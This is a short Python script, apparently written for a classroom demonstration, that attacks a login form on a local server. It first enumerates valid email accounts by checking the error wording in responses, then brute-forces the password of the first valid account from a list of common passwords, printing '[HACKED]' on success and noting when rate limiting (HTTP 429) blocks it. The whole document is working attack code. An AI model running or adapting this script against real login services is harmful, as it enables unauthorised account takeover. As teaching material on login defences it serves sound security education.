# atacante.py
import requests
import time

url = 'http://127.0.0.1:8000/login/'

emails_para_testar = ['teste@gmail.com', 'contato@hermes.com', 'admin@hermes.com', 'root@hermes.com']
senhas_para_testar = ['123456', 'qwert', 'admin', 'senha123', 'master']

# Palavras que costumam indicar que o usuário NÃO existe
erros_usuario = ["não existe", "inválido", "inválida", "not found", "não encontrado", "inexistente"]

print("Iniciando Fase 1: Enumeração de Usuários...")
usuario_valido = None

for email in emails_para_testar:
    time.sleep(1) # Pausa reduzida para manter a dinâmica da aula
    resposta = requests.post(url, data={'email': email, 'senha': 'qualquersenha'})
    
    # Verifica se o nosso IP foi bloqueado pela defesa do servidor!
    if resposta.status_code == 429:
        print(f"[!] Bloqueado pelo Rate Limit (Status 429)!")
        break
    
    texto_resposta = resposta.text.lower()
    
    # O script agora procura por qualquer palavra de erro. 
    # Se NÃO achar nenhuma delas, assume que o usuário existe.
    if not any(erro in texto_resposta for erro in erros_usuario):
        print(f"[+] BINGO! Usuário válido encontrado: {email}")
        print(f"    Status retornado: {resposta.status_code}")
        usuario_valido = email
        break
    else:
        print(f"[-] {email} não existe.")


if usuario_valido:
    print("\nIniciando Fase 2: Força Bruta de Senha...")
    for senha in senhas_para_testar:
        time.sleep(1)
        print(f"Testando senha: {senha}...")
        resposta = requests.post(url, data={'email': usuario_valido, 'senha': senha})
        
        # O atacante percebe que a defesa de bloqueio de conta foi ativada
        if resposta.status_code == 429:
            print(f"[!] A conta ou nosso IP foi bloqueado (Status 429) na senha '{senha}'!")
            break
            
        # Avalia o sucesso pelo Status Code (200 OK) ou palavras de sucesso genéricas
        if resposta.status_code == 200 or "sucesso" in resposta.text.lower() or "bem-vindo" in resposta.text.lower() or "autenticado" in resposta.text.lower():
            print(f"\n[HACKED] Acesso Liberado!")
            print(f"Email: {usuario_valido} | Senha: {senha}")
            print(f"Status HTTP: {resposta.status_code}")
            print(f"Servidor respondeu: {resposta.text}")
            break